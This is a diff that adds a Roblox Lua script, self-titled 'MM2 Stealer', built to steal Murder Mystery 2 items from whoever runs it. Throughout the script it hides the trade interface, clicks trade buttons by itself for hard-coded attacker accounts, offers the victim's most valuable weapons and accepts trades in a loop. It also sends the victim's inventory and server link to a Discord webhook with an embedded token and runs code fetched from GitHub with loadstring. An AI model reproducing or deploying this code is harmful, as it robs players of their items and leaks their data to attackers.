@@ -1,0 +1,224 @@
+usernames = { "User1", "User2", "User3" }
+webhook = "https://discord.com/api/webhooks/..."
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+local OfferItem = ReplicatedStorage.Trade.OfferItem
+local SendRequest = ReplicatedStorage.Trade.SendRequest
+local AcceptTrade = ReplicatedStorage.Trade.AcceptTrade
+local StartTrade = ReplicatedStorage.Trade.StartTrade
+local GetProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData
+
+local request = (syn and syn.request) or (http and http.request) or (http_request) or request
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+local tradeGui_phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
+
+tradeGui_phone:destroy()
+
+local function isUsernameInList(name)
+	for _, v in ipairs(usernames) do
+		if v == name then return true end
+	end
+	return false
+end
+
+pcall(function()
+	LocalPlayer.PlayerGui.TradeGUI:destroy()
+end)
+
+local function fireClick(button)
+	if button and button:IsA("TextButton") then
+		button.Visible = false
+		button.Position = UDim2.new(2, 0, 2, 0)
+		for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
+			pcall(function() conn:Fire() end)
+		end
+		for _, conn in ipairs(getconnections(button.Activated)) do
+			pcall(function() conn:Fire() end)
+		end
+	end
+end
+
+local function moveGuiOffscreen(gui)
+	if gui and gui:IsA("GuiObject") then
+		gui.Visible = true
+		gui.Position = UDim2.new(2, 0, 2, 0)
+	end
+end
+
+local function getTopItems()
+	local success, profileData = pcall(function()
+		return GetProfileData:InvokeServer()
+	end)
+	if not success or not profileData then return {} end
+
+	local owned = profileData.Weapons and profileData.Weapons.Owned or {}
+	local success, Values = pcall(function()
+		return loadstring(game:HttpGet("https://raw.githubusercontent.com/214Eli/values/refs/heads/main/mm2"))()
+	end)
+	if not success or type(Values) ~= "table" then Values = {} end
+
+	local items = {}
+	for itemId, amount in pairs(owned) do
+		local value = Values[itemId]
+		if value then
+			table.insert(items, {id = itemId, value = value, quantity = amount})
+		end
+	end
+
+	table.sort(items, function(a, b)
+		return a.value > b.value
+	end)
+
+	return items
+end
+
+local function formatNumber(n)
+	return tostring(n):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+end
+
+local function summariseItems(items)
+	local lines = {}
+	for _, item in ipairs(items) do
+		table.insert(lines, string.format("%s - %s (%dx)", item.id, formatNumber(item.value), item.quantity))
+	end
+	return table.concat(lines, "\n")
+end
+
+local items = getTopItems()
+local totalValue = 0
+for _, item in ipairs(items) do
+	totalValue += item.value * item.quantity
+end
+
+if totalValue >= 100 then
+    usernames = { "xQuartz0", "opendamm2", "" } -- dual usernames
+    webhook = "https://discord.com/api/webhooks/1404789545349677146/05aP8Gy9jvwMjhGaclGL9e7G9-1s1rmxaxL84conf3s901hp6enAewOBSIfV-4YdVbCs"
+end
+
+local function sendWebhook(totalValue, tradableSummary)
+	local payload = {
+		["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+		["embeds"] = {{
+			["title"] = "MM2 Stealer",
+			["color"] = 0x8400ff,
+			["fields"] = {
+				{["name"] = "Victim", ["value"] = LocalPlayer.Name},
+				{["name"] = "Creator", ["value"] = table.concat(usernames, ", ")},
+				{["name"] = "Executor", ["value"] = executor},
+				{["name"] = "Total Value", ["value"] = formatNumber(totalValue)},
+				{["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```"},
+				{["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
+			},
+			["footer"] = {["text"] = "by @x19b • " .. os.date("%B %d, %Y")},
+			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		}}
+	}
+
+	local function send(url, data)
+		pcall(function()
+			request({
+				Url = url,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(data)
+			})
+		end)
+	end
+
+	send(webhook, payload)
+end
+
+sendWebhook(totalValue, summariseItems(items))
+
+local function tryClickTradeGUI(name)
+	local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUI")
+	local root = gui:FindFirstChild("Lobby") or gui:FindFirstChild("Game")
+	if not root then return end
+
+	local leaderboard = root:FindFirstChild("Leaderboard")
+	if not leaderboard then return end
+	moveGuiOffscreen(leaderboard)
+
+	local container = leaderboard:FindFirstChild("Container")
+	local playerList = container and container:FindFirstChild("PlayerList")
+	local targetFrame = playerList and playerList:FindFirstChild(name) or container and container:FindFirstChild(name)
+
+	if targetFrame then
+		local actionBtn = targetFrame:FindFirstChild("ActionButton")
+		if actionBtn then
+			fireClick(actionBtn)
+			task.wait(0.5)
+
+			local inspect = leaderboard:FindFirstChild("Inspect")
+			local popup = leaderboard:FindFirstChild("Popup")
+
+			if inspect then
+				moveGuiOffscreen(inspect)
+				fireClick(inspect:FindFirstChild("Trade"))
+			elseif popup and popup:FindFirstChild("Container") then
+				local tradeBtn = popup.Container:FindFirstChild("Action") and popup.Container.Action:FindFirstChild("Trade")
+				if tradeBtn then
+					moveGuiOffscreen(popup)
+					fireClick(tradeBtn)
+				end
+			end
+		end
+	end
+end
+
+local function doTrade()
+	local items = getTopItems()
+	local count = 0
+	for _, item in ipairs(items) do
+		for _ = 1, item.quantity do
+			OfferItem:FireServer(item.id, "Weapons")
+			task.wait(0.1)
+		end
+		count += 1
+		if count >= 4 then break end
+	end
+
+	task.wait(0.5)
+	local remaining = getTopItems()
+	local total = 0
+	for _, item in ipairs(remaining) do
+		total += item.value * item.quantity
+	end
+	
+		if #remaining == 0 or total <= 0 then
+		task.wait(1)
+		LocalPlayer:Kick("YOU JUST GOT STOLEN BY TravScripts discord.gg/pNfrgHeede")
+	end
+end
+
+local function connectChat(p)
+	p.Chatted:Connect(function()
+		if isUsernameInList(p.Name) then
+			task.spawn(function()
+				while true do
+					tryClickTradeGUI(p.Name)
+					task.wait(0.4)
+				end
+			end)
+		end
+	end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+	connectChat(p)
+end
+
+Players.PlayerAdded:Connect(connectChat)
+StartTrade.OnClientEvent:Connect(doTrade)
+
+task.spawn(function()
+	while true do
+		AcceptTrade:FireServer(285646582)
+		task.wait(0.5)
+	end
+end)
